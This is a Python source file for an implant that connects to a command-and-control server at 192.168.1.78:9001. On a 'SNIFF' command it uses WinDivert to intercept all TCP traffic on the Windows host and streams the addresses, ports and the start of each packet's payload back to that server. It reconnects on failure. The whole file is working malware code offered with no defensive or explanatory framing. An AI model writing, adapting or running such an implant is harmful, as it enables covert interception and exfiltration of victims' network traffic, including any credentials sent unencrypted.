import socket
import pydivert
import time

SERVER_IP = "192.168.1.78"  # Update as needed
SERVER_PORT = 9001

def live_http_sniff(s):
    # This filter is to avoid WinError 87
    w_filter = "tcp" 
    
    try:
        with pydivert.WinDivert(w_filter) as w:
            s.send("[*] SUCCESS: Start browsing HTTP Traffic...\n".encode())
            for packet in w:
                if packet.dst_addr == SERVER_IP or packet.src_addr == SERVER_IP:
                    w.send(packet)
                    continue
                
                info = f"Traffic: {packet.src_addr} -> {packet.dst_addr}:{packet.dst_port}"
                
                # Capture HTTP Data if it exists
                if packet.tcp.payload:
                    payload = packet.tcp.payload.decode(errors='ignore')[:60].replace('\n', ' ')
                    info += f" | DATA: {payload}"

                s.send((info + "\n").encode())
                w.send(packet) # Sends packet continously to avoid disruption
    except Exception as e:
        s.send(f"Divert Error: {e}\n".encode())

def main():
    while True:
        try:
            print(f"[*] Connecting to C2 at {SERVER_IP}...")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            print("[+] Connected to Server.")

            while True:
                data = s.recv(1024).decode().strip().upper()
                if not data: break
                
                if data == "SNIFF":
                    live_http_sniff(s)
                elif data == "EXIT":
                    return
                else:
                    s.send(b"Unknown Command. Use 'SNIFF' or 'EXIT'.\n")
        except Exception as e:
            print(f"[-] Connection failed: {e}. Retrying in 5s...")
            time.sleep(5)

if __name__ == "__main__":
    main()